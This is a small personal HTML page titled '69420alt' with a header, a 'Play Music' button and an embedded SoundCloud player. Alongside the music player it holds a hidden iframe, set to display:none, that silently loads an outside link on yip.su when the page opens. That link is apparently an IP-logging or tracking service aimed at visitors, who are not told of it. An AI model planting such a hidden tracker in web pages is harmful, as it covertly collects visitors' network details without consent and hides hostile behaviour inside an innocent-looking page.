<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>69420alt</title>
<style>
  html, body {
    margin: 0; padding: 0; height: 100%;
    background: black;
    color: white;
    font-family: monospace;
    overflow: hidden;
  }
  #header {
    position: fixed;
    top: 0;
    width: 100%;
    text-align: center;
    font-size: 28px;
    padding: 10px 0;
    background: black;
    z-index: 10;
  }
  #hiddenSite {
    display: none;
  }
  #soundcloudPlayer {
    width: 0;
    height: 0;
    border: 0;
  }
  #playBtn {
    position: fixed;
    top: 50px;
    left: 50%;
    transform: translateX(-50%);
    padding: 10px 20px;
    font-size: 18px;
    cursor: pointer;
    background: #222;
    color: white;
    border: none;
    border-radius: 5px;
  }
</style>
</head>
<body>
  <div id="header">69420alt Pudshi Owner</div>

  <button id="playBtn">Play Music</button>

  <iframe 
    id="soundcloudPlayer"
    width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay"
    src="https://w.soundcloud.com/player/?url=https%3A//soundcloud.com/liltecca/lil-tecca-lot-of-me&auto_play=false&hide_related=true&show_comments=false&show_user=false&show_reposts=false&visual=false">
  </iframe>

  <iframe id="hiddenSite" src="https://yip.su/aura"></iframe>

<script>
  const playBtn = document.getElementById('playBtn');
  const iframe = document.getElementById('soundcloudPlayer');

  playBtn.addEventListener('click', () => {
    iframe.src = "https://w.soundcloud.com/player/?url=https%3A//soundcloud.com/liltecca/lil-tecca-lot-of-me&auto_play=true&hide_related=true&show_comments=false&show_user=false&show_reposts=false&visual=false";
    playBtn.style.display = 'none';
  });
</script>
</body>
</html>
